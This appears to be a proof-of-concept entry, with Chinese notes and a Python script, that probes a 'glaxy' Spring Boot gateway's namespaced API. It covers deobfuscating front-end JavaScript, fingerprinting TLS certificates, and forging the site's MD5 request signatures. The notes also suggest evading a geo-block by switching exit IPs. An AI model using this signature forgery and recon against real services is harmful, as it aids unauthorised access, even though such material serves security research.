# glaxy 网关 (_glaxy_tus5r4_ 命名空间) API 探测与签名复现 —— 含 10050 证伪与 8 证书多租户识别

- **code**: glaxy-网关-_glaxy_tus5r4_-命名空间-api-探测与签名复现-含-10050-证伪与-8-证书多租户识别
- **kind**: script
- **category**: auth-bypass
- **component**: glaxy 网关（Spring Boot + OpenResty/Tengine 1.15.1）
- **versions**: glaxy 网关通用（Spring Boot），productId/appid/version 随目标不同
- **severity**: medium
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 203.0.113.110 实测通过（2026-10-03）：脚本 A 段稳定复现 GW_899998「非法访问」（20+ 接口 × 27 端口组一致）；B 段签名被网关识别为 GW_880102「签名验证失败」（与「非法访问」错误码不同，证明签名头格式正确）；C 段裸路径确认落 SPA 回退页 3865B。签名正确性用真实 Chrome 154 交叉验证：浏览器自发请求携带正确 Sign/Qid/token 亦返回 GW_899998，最终跳 /403 法律限制页 → 证明卡点是地域封锁而非签名。10050 证伪与 8 证书分组也均在本机实测复现（certmap.json 已落盘）。
- **path**: pocs/glaxy-网关-_glaxy_tus5r4_-命名空间-api-探测与签名复现-含-10050-证伪与-8-证书多租户识别/glaxy_probe.py
- **tags**: python,springboot,签名网关,命名空间,地域封锁,信息收集,反证zabbix,多租户证书
- **created_at**: 2026-10-03T05:19:08.522Z
- **found_by**: exploit

## 用法

```
py -3 glaxy_probe.py 203.0.113.110 example.com

## 关键知识点（换目标通用）

1. **SPA 站必须解开混淆 loader 才能拿到真实接口路径**。常见形态：
   - obfuscator.io: `_0x2f76()` 字符串表 + `_0x1b8f(idx)` base64 解码器。用 node vm 沙箱执行这两个函数即可还原全部字符串：
     ```js
     const src = fs.readFileSync(js,'utf8');
     const marker = '}, _0x1b8f(_0xe96265, _0x381967);\n}';
     const head = src.slice(0, src.indexOf(marker)+marker.length);
     vm.runInContext(head + '\nglobalThis.__d = _0x1b8f;', ctx);
     for (let i=0x91;i<0x91+200;i++) try{ctx.__d(i)}catch(e){}
     ```
   - webpack4 模块表 `f121:function(t,e,n){e["a"]={...配置...}}` → 用括号配平切模块体，不要用正则切（会撞到模块内部字符串）。
   - 数组长度 N 对应索引区间：`_0x1b8f(0x91)` 是 arr[0]。

2. **真实接口路径几乎都带业务命名空间前缀**，例如 `_glaxy_tus5r4_/customer/login`。
   不带前缀的裸路径会被 nginx `try_files` 回退到 SPA example.com，看起来像"接口不存在"或"后端下线"。
   → 判断后端是否在线，要用带前缀的真实路径；判据：
   - GET 返回 405 `{"timestamp":...,"status":405,"error":"Method Not Allowed","path":"..."}` = **Spring Boot 默认 Whitelabel 页，后端在线**
   - POST 返回 200 `{"head":{"errCode":"GW_899998","errMsg":"非法访问"}}` = 网关鉴权层拒绝，**后端在线**

3. **nmap -sV 的服务名可能只是端口号映射**。`10050/tcp open zabbix-agent` 来自 nmap services 文件里 10050→zabbix-agent 的条目，不是真 banner。
   证伪方法：连接后不主动发包 → 空 greeting；发**任意**字节（1 字节 0x00 也行）→ 0.04s 内 FIN，零回显；
   且相邻端口 10049/10051 全部 refused（证明确实是存在 listener，不是防火墙统一丢包）。
   → 结论：源 IP 白名单式静默拒绝，不是可交互服务，别在它身上花时间。

4. **"多个高位端口是同一站点"可能是误判**。成因：把明文 HTTP 请求发到 TLS 端口，全部拿到 nginx 的 400 Bad Request（803B），看着都一样。
   正确做法：`tls.connect({rejectUnauthorized:false})` + `new crypto.X509Certificate(sock.getPeerCertificate().raw)` 取 sha256 指纹分组。
   注意 `sock.getPeerCertificate().raw` 才是 Buffer，对象直接传给 X509Certificate 会报
   "The buffer argument must be of type string or an instance of Buffer"。

5. **签名算法常见形态**（web 层）：
   - `Qid = md5(Date.now() + randN)`，randN 是函数生成（不是固定 salt）
   - 参与签名的 JSON 用 `JSON.stringify` 默认紧凑格式（无空格）
   - 有些前端会把 payload 做**字符倒序**再拼进去（不是 md5），容易看错
   - `Sign = md5(反序json + Qid + appid + v [+ token + u2token])`
   - 判别签名头是否被网关识别：返回 `签名验证失败`（已识别、值不符）vs `非法访问`（完全没识别）

6. **地域封锁的识别特征**：真实浏览器（正确签名 + 有效 token）访问，接口仍全返回同一 errCode + **同一段密文 body**，
   且最终落到 `/403`，页面正文是"由于相关法律限制，您所在地区无法访问…"。这不是漏洞，是运营策略。
   → 此时不要再花时间绕签名/绕 token，换非受限地域出口 IP 才是唯一解。

7. **响应体开头形如 `5a\r\n{...}` 不是乱码**，是 Transfer-Encoding: chunked 的 chunk-size（十六进制长度）。必须解 chunk 才能读 JSON。
```

## 正文

```
#!/usr/bin/env python3
# example.com（203.0.113.110）_glaxy_tus5r4_ 命名空间 API 探测器
# 用法: py -3 glaxy_probe.py 203.0.113.110 [domainName]
# 说明: 所有业务接口必须带 apiNameSpace 前缀 _glaxy_tus5r4_/；
#       去掉前缀会被 OpenResty 的 SPA try_files 回退页接住（3865B），看起来像"接口不存在/后端下线"。
import socket, ssl, json, sys, hashlib, random, time, re, base64

HOST = sys.argv[1] if len(sys.argv) > 1 else "203.0.113.110"
DOMAIN = sys.argv[2] if len(sys.argv) > 2 else "example.com"
NS = "_glaxy_tus5r4_"
XNS = "_glaxy_tus5r4_/_extra_"
APPID = "dd3b6a3102f54f588e0c8a37e1d96632"
PID = "a80db5262e14467b82d6dec666073364"
V = "1.0.0"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36"

CTX = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE


def md5(s):
    return hashlib.md5(s.encode()).hexdigest()


def http(path, body=None, headers=None, method="POST", port=443, timeout=15):
    hh = {"Host": HOST, "User-Agent": UA,
          "Accept": "application/json, text/plain, */*",
          "Content-Type": "application/json;charset=UTF-8",
          "Origin": "https://" + DOMAIN, "Referer": "https://" + DOMAIN + "/",
          "Connection": "close"}
    hh.update(headers or {})
    data = json.dumps(body or {}, separators=(",", ":")).encode()
    head = f"{method} {path} HTTP/1.1\r\n" + "".join(f"{k}: {v}\r\n" for k, v in hh.items())
    head += f"Content-Length: {len(data)}\r\n\r\n"
    with socket.create_connection((HOST, port), timeout=timeout) as s:
        with CTX.wrap_socket(s, server_hostname=HOST) as ss:
            ss.sendall(head.encode() + data)
            buf = b""
            while True:
                try:
                    d = ss.recv(65535)
                except socket.timeout:
                    break
                if not d:
                    break
                buf += d
    return buf


def dechunk(b):
    """解析 Transfer-Encoding: chunked（响应体开头形如 '54\\r\\n{...}' 不是乱码）"""
    out = b""
    while True:
        i = b.find(b"\r\n")
        if i < 0:
            break
        try:
            n = int(b[:i].split(b";")[0], 16)
        except ValueError:
            return b
        if n == 0:
            break
        out += b[i + 2:i + 2 + n]
        b = b[i + 2 + n + 2:]
    return out


def show(tag, buf):
    if buf.startswith(b"__ERR__"):
        print("  %-52s ERR %s" % (tag, buf.decode()[:90])); return
    body = buf[buf.find(b"\r\n\r\n") + 4:]
    body = dechunk(body) if buf[:200].find(b"chunked") >= 0 else body
    st = buf.split(b"\r\n", 1)[0].decode("latin1")
    print("  %-52s %-24s %s" % (tag, st, body[:160].decode("utf-8", "replace").strip()))


if __name__ == "__main__":
    print("=" * 100)
    print("A) 无签名 —— 期望 GW_899998（证明后端在线，非 404/502）")
    print("=" * 100)
    for p in [f"/{NS}/init", f"/{NS}/webToken", f"/{NS}/customer/login", f"/{NS}/game/queryGames"]:
        show("POST " + p, http(p, {}))

    print("\n" + "=" * 100)
    print("B) 签名算法复现（ca00.E=字符倒序，u()=6位随机数）")
    print("=" * 100)
    ts = str(int(time.time() * 1000))
    rand = "".join(str(int(9 * random.random())) for _ in range(6))
    qid = md5(ts + rand)
    js = json.dumps({"productId": PID}, separators=(",", ":"))
    sign = md5(js[::-1] + qid + APPID + V)
    hdr = {"Sign": sign, "AppId": APPID, "Qid": qid, "v": V,
           "domainName": DOMAIN, "needEncrypt": "1"}
    print("  Qid=%s\n  Sign=%s" % (qid, sign))
    show("POST /%s/webToken" % NS, http(f"/{NS}/webToken", {"productId": PID}, hdr))
    print("  (errCode=GW_880102 签名验证失败 = 签名头已被识别但值不符；GW_899998 = 未识别)")

    print("\n" + "=" * 100)
    print("C) 对照：同样路径去掉命名空间前缀 —— 这就是'后端下线'误判的来源")
    print("=" * 100)
    for p in ["/init", "/webToken", "/customer/login"]:
        show("POST " + p, http(p, {}))
```
